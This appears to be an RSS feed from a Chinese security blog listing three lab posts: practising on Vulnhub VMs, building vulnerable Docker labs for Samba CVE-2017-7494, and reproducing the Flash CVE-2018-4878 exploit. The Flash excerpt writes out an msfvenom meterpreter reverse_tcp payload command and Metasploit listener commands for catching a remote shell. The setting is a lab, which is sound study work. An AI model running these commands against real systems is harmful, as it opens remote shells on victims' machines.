@@ -1,0 +1,54 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>复现 on F0rmat&#39;Blog</title>
+    <link>https://getshe11.com/tags/%E5%A4%8D%E7%8E%B0/</link>
+    <description>Recent content in 复现 on F0rmat&#39;Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Thu, 03 May 2018 17:04:29 +0000</lastBuildDate><atom:link href="https://getshe11.com/tags/%E5%A4%8D%E7%8E%B0/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>用Vulnhub来练习漏洞靶场(爸爸再也不用担心我没有靶场练习了)</title>
+      <link>https://getshe11.com/posts/use-vulnhub-to-build-a-variety-of-hole-shooting-range-father-no-longer-have-to-worry-about-i-have-no-practice-range/</link>
+      <pubDate>Thu, 03 May 2018 17:04:29 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/use-vulnhub-to-build-a-variety-of-hole-shooting-range-father-no-longer-have-to-worry-about-i-have-no-practice-range/</guid>
+      <description>0x01 前言 Vulnhub它是一个提供各种漏洞环境的平台，里面大部分的环境是要用VMware或者VirtualBox打开运行的。 如果只是练习一些常见的漏洞可以看我另一篇用[Docker来搭建各种漏洞靶场(妈妈再也不用担心我没有靶场练习了)](https://getpass.cn/2018/03/14/Use Docker to build a variety of loopholes (my mother no longer has to worry about not having practiced in the shooting range)/)
+0x02 下载 https://www.vulnhub.com 里面有各种各样的镜像，可以下载到自己的机子上面练习。 镜像的下载地址和描述、难度等级等 随便点击下载，有些需要FQ才能下载，推荐官网的下载地址。 作为测试，我就下载JIS-CTF: VulnUpload作为演示吧
+Download (Mirror): https://download.vulnhub.com/jisctf/JIS-CTF-VulnUpload-CTF01.ova
+0x03 安装 下载完后，解压出来，会看到一个ovf后缀的文件 打开VMware，点击打开，找到我们刚才解压的文件，选择ovf文件 选择存放的位置，然后点击导入 最后等待导入完成，导入速度看本机性能和镜像的大小 0x04 设置 导入完成后，我设置的网络模式是NAT的，因为我内网比较多机子，所以选择这个方便等下扫描。还有就是内存大小，如果本机内存小于4G的请修改内存到4G以下。 我们点击开启虚拟机，到开机的页面我们回车选择第二个Ubuntu的高级选项（如果启动有网络正常的话可以直接正常开机，如果网络不正常可以按下面步骤操作） 进到高级选项，我们再次回车选择第二个Linux内核版本的恢复模式 等待系统启动完毕后，看到这个页面，我们继续回车进入 回车后会弹出选择界面，我们选择root一行回车，然后再次回车进入命令行模式 输入命令查看所以的网卡：ifconfig -a 我的是ens33，然后继续输入命令 vi /etc/network/interface修改网络配置文件 修改这两个地方，改成你的网卡名称，然后ctrl+x保存，最后输入reboot重启，OK！ 0x05 完成任务吧！ 作者给的描述是要我们找到靶机里面的5个flag
+ Description: There are five flags on this machine. Try to find them.</description>
+    </item>
+    
+    <item>
+      <title>用Docker来搭建各种漏洞靶场(妈妈再也不用担心我没有靶场练习了)</title>
+      <link>https://getshe11.com/posts/use-docker-to-build-a-variety-of-loopholes-my-mother-no-longer-has-to-worry-about-not-having-practiced-in-the-shooting-range/</link>
+      <pubDate>Wed, 14 Mar 2018 16:49:17 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/use-docker-to-build-a-variety-of-loopholes-my-mother-no-longer-has-to-worry-about-not-having-practiced-in-the-shooting-range/</guid>
+      <description>1. 前言 最近练习也在搭建这个漏洞环境，但是很费时间，然后就想到用Docker搭建比较快，又方便。不多废话，直接开始吧！
+2. 下载Docker 我本次是利用Windows 10 来安装Docker，因为Windows出现了一个问题需要解决下，Linux和Mac安装官网的安装方法基本没什么问题。
+官方下载地址：https://docs.docker.com/docker-for-windows/install/ 安装／升级你的Docker客户端 对于Windows 10以下的用户 推荐使用 Docker Toolbox Toolbox的介绍和帮助：mirrors.aliyun.com/help/docker-toolbox
+Windows系统的安装文件目录：http://mirrors.aliyun.com/docker-toolbox/windows/docker-toolbox/
+对于Windows 10以上的用户 推荐使用 Docker for Windows Windows系统的安装文件目录：http://mirrors.aliyun.com/docker-toolbox/windows/docker-for-windows/
+3. 安装Docker   运行安装文件：   安装完成：   安装完之后会出现一个问题，就是要你开win10里面的Hyper-V，这个功能和VMware是冲突的，所以你开了Hyper-V就不能用VMware了
+   开启Hyper-V然后重启就可以使用了。   4. 使用国内的Docker加速器 注册一个阿里云的账号：https://cr.console.aliyun.com/#/accelerator
+然后获取专属加速器地址： 在系统右下角托盘图标内右键菜单选择 Settings，打开配置窗口后左侧导航菜单选择 Docker Daemon。编辑窗口内的JSON串，填写加速器地址，如下所示：
+{ &amp;quot;registry-mirrors&amp;quot;: [&amp;quot;https://0sdzi917.mirror.aliyuncs.com&amp;quot;] } 5. 用Docker生成漏洞环境并使用  这里我用Samba远程代码执行漏洞(CVE-2017-7494)来做测试。   2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。
+ 获取环境   拉取镜像到本地 docker pull medicean/vulapps:s_samba_1</description>
+    </item>
+    
+    <item>
+      <title>Flash 0day漏洞(CVE-2018-4878)复现(每日一洞)</title>
+      <link>https://getshe11.com/posts/recurrence-of-flash-0day-vulnerability-cve-2018-4878/</link>
+      <pubDate>Tue, 13 Mar 2018 10:16:27 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/recurrence-of-flash-0day-vulnerability-cve-2018-4878/</guid>
+      <description>前言 这几天很忙，已经有两天没有更新文章了，最近CVE-2018-4878挺火的，还有群里的人也问这个怎么复现。今天就献丑复现一下，大表哥别喷，虽然我还没研究到这方面的漏洞分析，我会努力的，相信不久我也能写出二进制漏洞分析的文章。
+ 该漏洞影响 Flash Player 当前最新版本28.0.0.137以及之前的所有版本，而Adobe公司计划在当地时间2月5日紧急发布更新来修复此漏洞。从Adobe公告致谢来看，这个漏洞的野外攻击样本最早是由韩国计算机应急响应小组（KR-CERT）发现的，而KR-CERT也表示，来自朝鲜的黑客组织已经成功利用这个0Day 漏洞发起攻击。
+ 环境 攻击机： kali 2018 (192.168.59.6) 靶机： Windows 10 x64 (192.168.59.160) Web服务器： Windows 7 X64 (192.168.59.127)
+复现过程  我们先在kali生成一个python类型的shellcode msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.59.6 LPORT=6666 -f p ython &amp;gt; /root/shellcode.txt   LHOST就是kali的ip地址，6666端口你可以随便设置，/root/shellcode.txt要生成的文件路径  替换EXP里面的shellcode  使用cve-2018-4878.py生成文件，我这里用的是Sublime Text 3 Ctrl+B运行python，会在本目录下生成两个文件index.html,exploit.swf  然后把这两个文件放到Web服务器里面  在kali的MSF里面设置监听  msf &amp;gt; use exploit/multi/handler msf exploit(handler) &amp;gt; set payload windows/meterpreter/reverse_tcp msf exploit(handler) &amp;gt; set LHOST 192.168.59.6 msf exploit(handler) &amp;gt; set LPORT 6666 msf exploit(handler) &amp;gt; exploit 然后使用靶机的win10 IE访问Web服务器的文件index.</description>
+    </item>
+    
+  </channel>
+</rss>
